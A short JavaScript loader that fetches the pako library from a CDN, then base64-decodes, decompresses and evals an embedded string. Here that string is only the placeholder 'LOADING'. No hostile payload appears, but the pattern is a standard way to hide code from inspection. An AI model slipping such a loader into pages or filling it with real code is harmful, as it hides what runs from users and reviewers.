(function(){
  const s = document.createElement("script");
  s.src = "https://cdnjs.cloudflare.com/ajax/libs/pako/2.1.0/pako.min.js";
  s.onload = function() {
    const b64 = "LOADING";
    const data = Uint8Array.from(atob(b64), c => c.charCodeAt(0));
    const code = pako.inflate(data, { to: "string" });
    (0, eval)(code);
  };
  document.head.appendChild(s);
})();
